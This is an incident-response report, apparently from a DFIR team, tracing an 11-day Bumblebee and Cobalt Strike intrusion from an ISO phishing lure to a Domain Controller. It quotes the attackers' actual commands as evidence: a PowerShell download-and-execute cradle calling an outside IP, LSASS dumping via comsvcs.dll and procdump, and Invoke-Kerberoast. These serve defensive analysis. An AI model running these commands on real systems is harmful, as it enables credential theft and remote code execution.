# Case Summary

In this intrusion, the threat actors operated in an environment over an 11 day dwell period. The intrusion began with a password protected zipped ISO file that we assess with medium to high confidence due to other reports, likely arrived via an email which included a link to download said zip file.

The execution phase started with that password protected zip, which after extracting would show the user an ISO file that after the user double clicks would mount like a CD or external media device on Windows and present the user with a single file named documents in the directory.

When the user double clicks or opens the lnk file, they inadvertently start a hidden file, a DLL (namr.dll) containing the Bumblebee malware loader. From there, the loader reached out to the Bumblebee C2 servers. At first, things remained fairly quiet, just C2 communications; until around 3 hours later, Bumblebee dropped a Cobalt Strike beacon named wab.exe on the beachhead host. This Cobalt Strike beacon was subsequently executed and then proceeded to inject into various other processes on the host (explorer.exe, rundll32.exe). From these injected processes, the threat actors began discovery tasks using Windows utilities like ping and tasklist.

Four hours after initial access, the threat actor used RDP to access a server using the local Administrator account. The threat actor then deployed AnyDesk, which was the only observed persistence mechanism used during the intrusion. The threat actor then started Active Directory discovery using Adfind.

After this activity, the threat actors went silent. Then, the next day, they accessed the server via RDP and deployed a bespoke tool, VulnRecon, designed to identify local privilege escalation paths on a Windows host.

The next check in from the threat actors, occurred on the 4th day, where the threat actors again ran VulnRecon, but from the beachhead host instead of the server. AdFind was used again as well. Next, the threat actor transferred Sysinternals tool Procdump over SMB, to the ProgramData folders on multiple hosts in the environment. They then used remote services to execute Procdump, which was used to dump LSASS. At this point, the actors appeared to be searching for more access then they currently had. While they were able to move laterally to workstations and at least one server, it seemed that they had not yet taken control of an account that provided them the access they were seeking, likely a Domain Admin or similarly highly privileged account.

After that activity, the threat actors then disappeared until the 7th day, at which time they accessed the server via Anydesk. Again, they executed VulnRecon and then also executed Seatbelt, a red team tool for preforming various host based discovery.

On the final day of the intrusion, the 11th day since the initial entry by the threat actor, they appeared to be preparing to act on final objectives. The threat actors used PowerShell to download and execute a new Cobalt Strike PowerShell beacon in memory on the beachhead host. After injecting into various processes, the threat actors executed the PowerShell module Invoke-Kerberoast. Next, they used yet another technique to dump LSASS on the beachhead host, this time using a built in Windows tool comsvcs.dll. AdFind was run for a 3rd time in the network, and then two batch scripts were dropped and run. These batch scripts’ purposes were to identify all online servers and workstations in the environment, often a precursor to ransomware deployment by creating the target list for that deployment.

After the scripts ran, a new Cobalt Strike executable beacon was run on the beachhead. Next, the threat actors used a service account to execute a Cobalt Strike beacon remotely on a Domain Controller. This service account had a weak password, which was most likely cracked offline after being kerberoasted earlier in the intrusion.

The threat actors were then evicted from the environment before any final actions could be taken. We assess based on the level of access and discovery activity from the final day, the likely final actions would have been a domain wide ransom deployment.

# Initial Access

The threat actors managed to get access to the beachhead host after the successful execution of a lnk file within an ISO, which are usually distributed through email campaigns.

The initial payload named BC_invoice_Report_CORP_46.iso, is an ISO image that once mounted, lures the user to open a document.lnk file which will execute the malicious DLL loader using the following command line:

C:\Windows\System32\cmd.exe /c start rundll32 namr.dll,IternalJob

Running Eric Zimmerman’s tool LECmd revealed additional details related to the threat actors. The metadata included TA machine’s hostname, MAC address, and the LNK document creation date:

# Execution

# Execution of multiple payloads

The successful execution of BumbleBee payload (namr.dll) resulted in the dropping and the execution of several payloads using multiple techniques. The graph below shows all the payloads dropped by BumbleBee, the way they were executed, and the different processes they injected into:

Sysmon File Created event showing wab.exe created by rundll32.exe

Sysmon Event Code 1 showing wab.exe executed by WMI

# Execution of Cobalt Strike

The following PowerShell one-liner was executed from wab.exe during day 11, which downloaded obfuscated PowerShell and executed it in memory:

C:\Windows\system32\cmd.exe /C powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://104.243.33.50:80/a'))"

Since the download took place over an unencrypted HTTP channel, the network traffic was plainly visible.

This payload can be deobfuscated using the following CyberChef recipe:

Once deobfuscated, we can spot the MZRE header, which is part of the default configuration of Cobalt Strike:

One of the easiest ways to extract valuable information from this Shellcode is using Didier Stevens 1768.py tool:

The command and control server was hosted on (108.62.12[.]174/dofixifa[.]co). The full config extraction, detailing the Malleable C2 profile, is available in Command and Control section.

# Persistence

AnyDesk and its installation as a service was used in order to persist and create a backdoor to the network.

# Privilege Escalation

# GetSystem

Threat actors made a mistake by launching the getsystem command in the wrong console (shell console rather than the beacon console). The parent process of this command was C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc , a process where Cobalt Strike was injected into:

C:\Windows\system32\cmd.exe /C getsystem

This command is a built-in Cobalt Strike command that is used to get SYSTEM privileges. A detailed write-up of this feature is documented in the official Cobalt Strike blog and was also detailed in our Cobalt Strike, a Defender’s Guide blog post.

# Valid Accounts

Threat actors obtained and abused credentials of privilege domain accounts as a means of gaining privilege escalation on the domain. They also utilized local administrator accounts.

A service account, with Domain Admin permissions, was used to create a remote service on a Domain Controller to move laterally.

# Defense Evasion

# Process Injection

The process injection technique was used multiple times to inject into different processes. Almost every post-exploitation job was launched from an injected process.

Right after its execution, the wab.exe process created two remote threads in order to inject code into explorer.exe and rundll32.exe:

Threat actors also created a remote thread in svchost.exe:

Multiple processes were then spawned by :

C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc

to perform various techniques (Enumeration, Credential dumping, etc.):

A Yara scan of process memory using the Malpedia Cobalt Strike rule revealed the various injections across hosts.

Indicator Removal on Host: File Deletion

We observed the threat actors deleting their tools (Procdump, Network scanning scripts, etc.) from hosts.

The table below shows an example of ProcDump deletion from the ProgramData folder of all targeted workstations after dumping their LSASS process:

# Credential Access

# LSASS Dump

# MiniDump

Threat actors dumped the LSASS process from the beachhead using the comsvcs.dll MiniDump technique via the C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc beacon:

cmd.exe /C rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 968 C:\ProgramData\REDACTED\lsass.dmp full

# ProcDump

Threat actors also dropped procdump.exe and procdump64.exe on multiple workstations remotely, dumped LSASS, and deleted them from the ProgramData folder:

The ProcDump utility was executed on those workstations using the following command line:

C:\programdata\procdump64.exe -accepteula -ma lsass.exe C:\ProgramData\lsass.dmp

# Kerberoasting

Invoke-Kerberoast command was executed from the beachhead through svchost.exe, a process where the threat actors injected:

Here is an extract of PowerShell EventID 800 showing different Invoke-Kerberoast options used by threat actors, including HashCat output format:

IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:36177/'); Invoke-Kerberoast -OutputFormat HashCat | fl | Out-File -FilePath C:\ProgramData\REDACTED\ps.txt -append -force -Encoding UTF8

Right after the execution of Invoke-Kerberoast, DC logs show that multiple Kerberos Service Tickets were requested from the beachhead host, with ticket encryption type set to 0x17 (RC4) and ticket options to 0x40810000, for service accounts.

Around 3 hours later, one of the service accounts logged into one of the Domain Controllers from the beachhead.

We assess with high confidence that the service account password was weak and cracked offline by threat actors.

# Discovery

# Reconnaissance

System Information & Software Discovery

The following commands were launched by the wab.exe beacon:

whoami ipconfig /all tasklist systeminfo wmic product get name,version wmic /node:<REDACTED> process list brief net view \\<REDACTED>\Files$ /all dir \\<REDACTED>\C$\

Using the same beacon, wab.exe, tasklist was also used in order to enumerate processes on multiple hosts remotely:

tasklist /v /s <REMOTE_IP>

# Admin Groups and Domains Discovery

As we have already observed in multiple cases, the threat actors enumerated the local administrators group and domain privileged (Enterprise and DAs) administrators groups mainly using net command:
- net use 
- net group "Domain computers" /dom 
- net group "Enterprise admins" /domain 
- net group "domain admins" /domain 
- net localgroup administrators nltest /dclist: nltest /domain_trusts ping -n 1 <REMOTE_IP>

# Opsec mistake

Threat actors failed on a part of their tasks, by executing the command in the wrong console:

C:\Windows\System32\rundll32.exe ➝ C :\Windows\system32\cmd.exe /C shell whoami /all

We can assert with high confidence that the recon stage was not fully automated, and threat actors manually executed commands and made a mistake in one of those.

# AdFind

To enumerate Active Directory, the threat actors executed AdFind from the beachhead host, on three different occasions:

The source of execution, the initiating parent process, was different on each occasion and the name of AdFind binary and the result files were different on one occasion, which could indicate multiple Threat actors accessing the network.

# Network scanning

Threat actors used two scripts named s.bat (for servers) and w.bat (for workstations) to ping the hosts and store the results in two log files:

s.bat script:

w.bat script:

Both of those scripts were executed from the PowerShell Cobalt Strike beacon (powershell.exe).

# Invoke-ShareFinder
Invoke-ShareFinder is a PowerShell module which is part of PowerView.

Invoke-ShareFinder – finds (non-standard) shares on hosts in the local domain

Threat actors performed share enumeration using Invoke-ShareFinder.

Because rundll32.exe executed PowerShell, we can see that rundll32.exe created the ShareFinder.txt output file in C:\ProgramData\.

# Seatbelt

The tool SeatBelt was used by the threat actors on a server in order to discover potential security misconfigurations.

Seatbelt is a C# project that performs a number of security oriented host-survey “safety checks” relevant from both offensive and defensive security perspectives.

Threat actors performed a full reconnaissance by specifying the flag -group=all :

Seatbelt.exe -group=all -outputfile="C:\ProgramData\seatinfo.txt"

# VulnRecon

Threat actors dropped two binaries named vulnrecon.dll and vulnrecon.exe on two hosts. This is the first time we’ve observed this tool. This library seems to be a custom tool developed to assist threat actors with Windows local privilege escalation enumeration.

The table below summarizes the capabilities of the tool:


Below is the list of all of the currently supported (or implemented) CVE enumeration via installed KBs mapping:

Threat actors executed this tool on patient 0 with low-level privileges multiple times, and again on a server with Administrator privileges. Below are all the command lines run by the adversaries:

# Lateral Movement

# Lateral Tool Transfer

Using the Cobalt Strike beacon, the threat actors transferred AnyDesk (1).exe file from the beachhead to a server:

The threat actors also transferred ProcDump from the beachhead to multiple workstations:

# Remote Services

# Remote Desktop Protocol

Threat actors used explorer.exe, where they were previously injected into, to initiate a proxied RDP connection to a server:

Threat actors performed the first lateral movement from the beachhead to the server using RDP with an Administrator account:

This first lateral movement was performed in order to drop and install AnyDesk.

# SMB/Windows Admin Shares

# Remote Service over RPC

Multiple RPC connections were initiated from the rundll32.exe process where wab.exe previously injected into:

These RPC connections targeted multiple hosts, including workstations, servers, and DCs.

As we can see with one server, which was targeted, the win32 function CreateServiceA was used by the malware in order to create a remote service over RPC on the server.

# Cobalt Strike built-in PsExec

Threat actors used the built-in Cobalt Strike jump psexec command to move laterally. On each usage of this feature, a remote service was created with random alphanumeric characters, service name and service file name, e.g. “<7-alphanumeric-characters>.exe”.

Below is an example of the service edc603a that was created on a Domain Controller:

The account used to perform this lateral movement was one of the kerberoasted service accounts.

The service runs a rundll32.exe process without any arguments. This process was beaconing to (108.62.12[.]174/dofixifa[.]co), the second Cobalt Strike C2, used during the last day of this intrusion.

We observed this beacon performing various techniques (process injections in svchost process via CreateRemoteThread, default named pipes, etc.)

# Command and Control

The graph below shows all communications to malicious IP addresses made by the dropped payloads or processes which threat actors injected into:

# BumbleBee


# Cobalt Strike

Cobalt Strike (CS) was extensively used during this intrusion, the threat actors used CS as the main Command and Control tool, dropped several payloads, and injected into multiple processes on different hosts.

# C2 Servers

Two CS C2 servers were used during this intrusion. The graph below shows beaconing activity over time, we can notice the continuous usage of the first C2 server (45.153.243[.]142/fuvataren[.]com) from day 1 and the second C2 server (108.62.12[.]174/dofixifa[.]co) during the last day of intrusion only (day 11):

The main beacon wab.exe:


The PowerShell beacon:



# Default named pipes

The threat actors used default CS configuration and default named pipes. Named pipes were created in order to establish communication between CS processes:

In this particular case, threat actors used default post-exploitation jobs, which have a pattern of postex_[0-9a-f]{4} .

Below is the full list of all default named pipes spotted during this intrusion:

Named pipes are commonly used by Cobalt Strike to perform various techniques. Here is a Guide to Named Pipes and Hunting for Cobalt Strike Pipes from one of our contributors @svch0st.

# AnyDesk

As mentioned before in the lateral tool transfer section, threat actors remotely dropped the AnyDesk binary on a server from the beachhead:

A new service was created (Event ID 7045) upon the execution of AnyDesk installer:

AnyDesk logs, %ProgramData%\AnyDesk\ad_svc.trace and %AppData%\AnyDesk\ad.trace , show that it was used during Day 1 and Day 7 of this intrusion, using the local Administrator account each time. The usage of AnyDesk can be relatively easy to spot if you have the right logs (*.anydesk.com domains, AnyDesk user agent, etc.):

The usage of AnyDesk also triggered two ET signatures:

ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software) ET USER_AGENTS AnyDesk Remote Desktop Software User-Agent

Again, those are quick wins to add to your detection capabilities to detect the usage of unauthorized remote administration tools, commonly used by ransomware operators

AnyDesk configuration file and the network logs revealed that the id used was 159889039 and the source IP was 108.177.235.25 (LeaseWeb USA – Cloud Provider).

# Impact

There was no impact (exfiltration, data encryption, or destruction) during this intrusion. However, the observed TTPs show common cybercrime threat actors tradecraft which may have lead to domain wide ransomware had the threat actors had enough time.

# MITRE ATT&CK DATASET
Phishing – T1566

Malicious File – T1204.002

Windows Command Shell – T1059.003

PowerShell – T1059.001

Process Injection – T1055

File Deletion – T1070.004

LSASS Memory – T1003.001

Kerberoasting – T1558.003

Domain Account – T1087.002

Domain Trust Discovery – T1482

Lateral Tool Transfer – T1570

Remote Desktop Protocol – T1021.001

Valid Accounts – T1078

Remote Access Software – T1219

Ingress Tool Transfer – T1105

Web Protocols – T1071.001

System Services – T1569

SMB/Windows Admin Shares – T1021.002

Software Discovery – T1518

System Network Configuration Discovery – T1016

Remote System Discovery – T1018

Process Discovery – T1057

Mark-of-the-Web Bypass – T1553.005

Masquerading – T1036

Rundll32 – T1218.011

Domain Groups – T1069.002

Windows Management Instrumentation – T1047

Password Guessing – T1110.001
